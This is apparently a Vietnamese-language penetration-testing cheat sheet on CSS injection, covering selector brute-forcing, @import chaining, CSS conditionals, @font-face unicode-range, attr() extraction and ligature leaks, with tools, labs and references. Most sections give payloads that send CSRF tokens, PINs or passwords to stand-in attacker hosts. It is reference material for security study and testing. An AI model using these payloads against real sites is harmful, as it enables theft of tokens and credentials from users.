# CSS Injection

> CSS Injection là một lỗ hổng xảy ra khi một ứng dụng cho phép CSS không đáng tin cậy được chèn vào một trang web. Điều này có thể bị khai thác để đánh cắp dữ liệu nhạy cảm, chẳng hạn như CSRF token hoặc các bí mật khác, bằng cách thao túng bố cục trang hoặc kích hoạt các request mạng dựa trên thuộc tính của phần tử.

## Tóm tắt

* [Công cụ](#tools)
* [Phương pháp](#methodology)
    * [CSS Selectors](#css-selectors)
    * [CSS Import at-rule](#css-import-at-rule)
    * [CSS Conditionals](#css-conditionals)
    * [CSS Font-face at-rule](#css-font-face-at-rule)
    * [Trích xuất thuộc tính qua attr()](#attribute-extraction-via-attr)
    * [Ligatures](#ligatures)
* [Labs](#labs)
* [Tài liệu tham khảo](#references)

## Công cụ

* [hackvertor/blind-css-exfiltration](https://github.com/hackvertor/blind-css-exfiltration) - Công cụ để đánh cắp dữ liệu từ các trang web chưa biết bằng Blind CSS.
* [PortSwigger/css-exfiltration](https://github.com/PortSwigger/css-exfiltration) - Tập hợp các kỹ thuật exfiltration dựa trên CSS.
* [cgvwzq/css-scrollbar-attack](https://github.com/cgvwzq/css-scrollbar-attack) - PoC để rò rỉ các text node thông qua CSS injection bằng thanh cuộn.
* [d0nutptr/sic](https://github.com/d0nutptr/sic) - Sequential Import Chaining cho kỹ thuật exfiltration CSS nâng cao.
* [adrgs/fontleak](https://github.com/adrgs/fontleak) - Công cụ để đánh cắp văn bản nhanh chỉ dùng CSS và Ligatures.

## Phương pháp

### CSS Selectors

Các CSS selector có thể được dùng để đánh cắp dữ liệu. Kỹ thuật này đặc biệt hữu ích vì CSS thường được cho phép trong các quy tắc CSP, trong khi JavaScript lại thường bị chặn.

Cuộc tấn công hoạt động bằng cách brute-force một token từng ký tự một. Sau khi ký tự đầu tiên được xác định, payload được cập nhật để đoán ký tự thứ hai, và cứ tiếp tục như vậy. Điều này thường đòi hỏi một iframe để tải lại trang với payload mới.

* `input[value^=a]` (prefix attribute selector): Chọn các phần tử có giá trị bắt đầu bằng "a".
* `input[value$=a]` (suffix attribute selector): Chọn các phần tử có giá trị kết thúc bằng "a".
* `input[value*=a]` (substring attribute selector): Chọn các phần tử có giá trị chứa "a".

#### Đánh cắp dữ liệu qua Background Image

Khi một selector khớp, trình duyệt sẽ cố gắng tải ảnh nền từ một URL do kẻ tấn công kiểm soát, từ đó làm rò rỉ ký tự đó.

```css
input[value^="TOKEN_012"] {
  background-image: url(http://attacker.example.com/?prefix=TOKEN_012);
}
```

```css
input[name="pin"][value="1234"] {
  background: url(https://[ATTACKER.DOMAIN.TLD]/log?pin=1234);
}
```

**Mẹo:**

* **Input ẩn (Hidden Inputs)**: Bạn không thể áp dụng ảnh nền trực tiếp lên một trường input ẩn. Thay vào đó, hãy dùng sibling selector (`+` hoặc `~`) để tạo style cho một phần tử hiển thị xuất hiện sau input ẩn đó.

```css
input[name="csrf-token"][value^="a"] + input {
  background: url(https://[ATTACKER.DOMAIN.TLD]/?q=a)
}
```

* **Has Selector**: Pseudo-class `:has()` cho phép tạo style cho một phần tử cha dựa trên các phần tử con của nó.

```css
div:has(input[value="1337"]) {
  background:url(/collectData?value=1337);
}
```

* **Tính đồng thời (Concurrency)**: Sử dụng cả prefix và suffix selector để tăng tốc quá trình đoán. Bạn có thể gán việc kiểm tra prefix cho một thuộc tính (ví dụ: `background`) và kiểm tra suffix cho một thuộc tính khác (ví dụ: `list-style-image` hoặc `border-image`).

### CSS Import at-rule

Kỹ thuật này được gọi là **Blind CSS Exfiltration**. Nó dựa vào việc import các stylesheet bên ngoài để kích hoạt các callback.

```html
<style>@import url(http://[ATTACKER.DOMAIN.TLD]/staging?len=32);</style>
<style>@import'//[ATTACKER.DOMAIN.TLD]'</style>
```

Các frame không phải lúc nào cũng cần được tải lại để đánh giá lại CSS. Quy tắc `@import` cho phép có độ trễ; trình duyệt sẽ xử lý việc import và áp dụng các style mới.

#### Sequential Import Chaining (SIC)

SIC cho phép kẻ tấn công xâu chuỗi nhiều bước trích xuất mà không cần tải lại trang:

1. Chèn một quy tắc `@import` ban đầu trỏ đến một payload trung gian (staging).
2. Payload trung gian giữ kết nối mở (long-polling) trong khi tạo ra payload cụ thể tiếp theo.
3. Khi một quy tắc CSS khớp (ví dụ: một ký tự được tìm thấy qua `background-image`), trình duyệt sẽ thực hiện một request.
4. Máy chủ phát hiện request này và tạo ra quy tắc `@import` tiếp theo để tiếp tục chuỗi.

### CSS Conditionals

#### Inline Style Exfiltration

Kỹ thuật nâng cao này tận dụng các CSS conditional (như `if()`) và biến để thực hiện logic trực tiếp bên trong một thuộc tính style.

Ví dụ: Đánh cắp một thuộc tính `data-uid` nếu nó khớp với một giá trị từ 1 đến 10.

```html
<div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3); else: if(style(--val:"4"): url(/4); else: if(style(--val:"5"): url(/5); else: if(style(--val:"6"): url(/6); else: if(style(--val:"7"): url(/7); else: if(style(--val:"8"): url(/8); else: if(style(--val:"9"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>
```

### CSS Font-face at-rule

> @font-face là một at-rule của CSS dùng để chỉ định một font tùy chỉnh để hiển thị văn bản; font này có thể được tải từ một máy chủ từ xa hoặc từ một font được cài đặt cục bộ trên máy tính của người dùng. - Mozilla

Thuộc tính `unicode-range` cho phép sử dụng các font cụ thể cho các ký tự cụ thể. Chúng ta có thể lợi dụng điều này để phát hiện xem một ký tự cụ thể có xuất hiện trên trang hay không.

Nếu ký tự "A" có mặt, trình duyệt sẽ cố gắng tải font từ `/?A`. Nếu "C" không có mặt, request đó sẽ không bao giờ được thực hiện.

```html
<style>
@font-face{ font-family:poc; src: url(http://attacker.example.com/?A); /* fetched */ unicode-range:U+0041; }
@font-face{ font-family:poc; src: url(http://attacker.example.com/?B); /* fetched too */ unicode-range:U+0042; }
@font-face{ font-family:poc; src: url(http://attacker.example.com/?C); /* not fetched */ unicode-range:U+0043; }
#sensitive-information{ font-family:poc; }
</style>
<p id="sensitive-information">AB</p>
```

**Hạn chế:**

* Nó không thể phân biệt các ký tự lặp lại (ví dụ: "AA" chỉ kích hoạt request một lần).
* Nó không xác định được thứ tự của các ký tự.
* Mặc dù có những hạn chế này, đây vẫn là một oracle rất đáng tin cậy để kiểm tra sự tồn tại của ký tự.
* Chrome đã đánh dấu vấn đề này là "WontFix": [issues/40083029](https://issues.chromium.org/issues/40083029)

### Trích xuất thuộc tính qua attr()

Hàm `attr()` của CSS cho phép CSS lấy giá trị của một thuộc tính từ phần tử được chọn. Với các bản cập nhật gần đây (xem [Advanced attr()](https://developer.chrome.com/blog/advanced-attr)), hàm này có thể được dùng để trích xuất giá trị của input.

HTML mục tiêu:

```html
<html>
    <head>
        <link rel="stylesheet" href="http://attacker.local/index.css">
    </head>
    <body>
        <input type="text" name="password" value="supersecret">
    </body>
</html>
```

`index.css` (được lưu trữ bởi kẻ tấn công):

```css
input[name="password"] {
  background: image-set(attr(value))
}
```

Khi `image-set()` được sử dụng cùng với `attr()`, trình duyệt có thể cố gắng diễn giải giá trị thuộc tính như một URL. Nếu stylesheet thuộc miền khác (cross-domain), URL tương đối sẽ được phân giải dựa trên nguồn gốc (origin) của stylesheet, chứ không phải của trang.

Request kết quả trên máy chủ của kẻ tấn công:

```ps1
10.10.10.10 - - [15/Feb/2026 16:33:21] "GET /supersecret HTTP/1.1" 404 -
```

### Ligatures

Kỹ thuật này khai thác các font tùy chỉnh và ligature. Một ligature kết hợp nhiều ký tự thành một glyph duy nhất. Bằng cách tạo ra một font tùy chỉnh trong đó các chuỗi ký tự cụ thể (ví dụ: nội dung văn bản cụ thể) tạo ra một ligature có độ rộng rất lớn, chúng ta có thể phát hiện sự thay đổi trong bố cục.

1. Tạo một font tùy chỉnh với các ligature cho các chuỗi mục tiêu.
2. Sử dụng media query hoặc thanh cuộn để phát hiện xem độ rộng hiển thị của phần tử có thay đổi hay không.

```ps1
docker run -it --rm -p 4242:4242 -e BASE_URL=http://localhost:4242 ghcr.io/adrgs/fontleak:latest
```

Ví dụ payload sử dụng `fontleak` với một selector, phần tử cha, và bảng chữ cái tùy chỉnh.
**Cảnh báo**: CSS selector phải khớp chính xác với một phần tử duy nhất trên trang mục tiêu.

```html
<style>@import url("http://localhost:4242/?selector=.secret&parent=head&alphabet=abcdef0123456789");</style>
```

## Labs

* [Dojo #25 RootCSS - YesWeHack](https://dojo-yeswehack.com/challenge-of-the-month/dojo-25)

## Tài liệu tham khảo

* [0CTF 2023 Writeups - Web - newdiary - aszx87410 - 11 tháng 12, 2023](https://web.archive.org/web/20260208112931/https://blog.huli.tw/2023/12/11/en/0ctf-2023-writeup/)
* [Bench Press: Leaking Text Nodes with CSS - pspaul - 20 tháng 10, 2024](https://web.archive.org/web/20250809122224/https://blog.pspaul.de/posts/bench-press-leaking-text-nodes-with-css/)
* [Better Exfiltration via HTML Injection - d0nut - 11 tháng 4, 2019](https://web.archive.org/web/20260206153955/https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [Blind CSS Exfiltration: exfiltrate unknown web pages - Gareth Heyes - 5 tháng 12, 2023](https://web.archive.org/web/20231205201432/https://portswigger.net/research/blind-css-exfiltration)
* [CSS based Attack: Abusing unicode-range of @font-face - Masato Kinugawa - 23 tháng 10, 2015](https://web.archive.org/web/20260212042745/https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html)
* [CSS Data Exfiltration to Steal OAuth Token - - 13 tháng 9, 2025](https://web.archive.org/web/20250601232405/https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token)
* [CSS Injection - xsleaks.dev - 9 tháng 5, 2025](https://web.archive.org/web/20260114161847/https://xsleaks.dev/docs/attacks/css-injection/)
* [CSS Injection Attacks or how to leak content with <style> - Pepe Vila - 28 tháng 9, 2025](https://web.archive.org/web/20250928084357/https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf)
* [CSS Injection: Attacking with Just CSS (Part 2) - aszx87410 - 24 tháng 9, 2023](https://web.archive.org/web/20231223213409/https://aszx87410.github.io/beyond-xss/en/ch3/css-injection-2/)
* [Fontleak: exfiltrating text using CSS and Ligatures - Dragos Albastroiu - 16 tháng 4, 2025](https://web.archive.org/web/20251130021102/https://adragos.ro/fontleak/)
* [How you can steal private data through CSS injection - invicti - 23 tháng 4, 2018](https://web.archive.org/web/20251107094938/https://www.invicti.com/blog/web-security/private-data-stolen-exploiting-css-injection)
* [Inline Style Exfiltration: leaking data with chained CSS conditionals - Gareth Heyes - 26 tháng 8, 2025](https://web.archive.org/web/20260226022330/https://portswigger.net/research/inline-style-exfiltration)
